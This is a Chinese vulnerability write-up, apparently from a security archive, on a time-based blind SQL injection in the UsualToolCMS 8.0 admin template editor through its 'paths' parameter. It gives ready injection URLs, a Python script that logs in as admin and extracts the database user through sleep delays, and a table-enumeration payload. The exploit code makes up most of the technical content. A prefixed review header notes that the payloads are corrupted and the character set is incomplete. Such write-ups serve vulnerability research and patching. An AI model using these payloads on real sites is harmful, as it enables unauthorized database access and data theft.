---
source: "白阁文库 BaizeSec/bylibrary"
product: "UsualToolCMS8.0Release"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolCMS-8.0 sql注⼊漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：管理员登录+验证码、paths拼SQL及MySQLsleep"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-1451939f7e61654b1962460a"
entity_id: "ve-1451939f7e61654b1962460a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：管理员登录+验证码、paths拼SQL及MySQLsleep

- **证据待核（1）**：Copy前缀污染payload和Python首行，不能原样执行；源码截图位置空白。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（2）**：sleep5但阈值&gt;7秒可能漏真；候选字符来自root@localhostasfafsasf不是完整字符集，固定14位。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：原始下载链接有具体Release，但缺patch/原披露；与432同原语补角色信息。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolCMS-8.0 sql注⼊漏洞

### 0x01 漏洞环境

版本信息：UsualToolCMS-8.0-Release
 版本下载：http://www.a5xiazai.com/php/140604.html
 官网下载：https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip

### 0x02 漏洞分析

在./cmsadmin/a_templetex.php文件第137行，paths变量没有过滤，136行从get处获取paths，没有任何过滤:


当从get处获得的t等于open时就可以出发这个sql注入，在文件第129行:


构造payload：

```
Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+
```


由于是时间盲注，编写延迟注入脚本:

```
Copy# -*- coding:utf-8 -*-
import time
import requests
session = requests.session()
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'}
img_url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/class/UsualToolCMS_Code.php?r=13720'
img_req = session.get(url=img_url,headers=headers).content
with open('pic.png','wb') as f:
    f.write(img_req)
code = input('请输入验证码：')
data = {
    'uuser':'admin',
    'upass':'admin',
    'ucode':code
}
payloads = list('root@localhostasfafsasf')
url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login'
response = session.post(url=url,headers=headers,data=data)
res_url_1 = "http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),{},1))={},sleep(5),1)--+"
result = ''
for i in range(1,15):
    for payload in payloads:
        res_url_2 = res_url_1.format(str(i),ord(payload))
        start_time = time.time()
        response = session.get(url=res_url_2,headers=headers)
        if time.time() - start_time > 7:
            result = result + payload
            print(result)
            break
```


爆数据库表payload：

```
Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>0,sleep(5),1)--+
```


\----------------------------------------------------------------------------


---

> 来源：白阁文库 BaizeSec/bylibrary
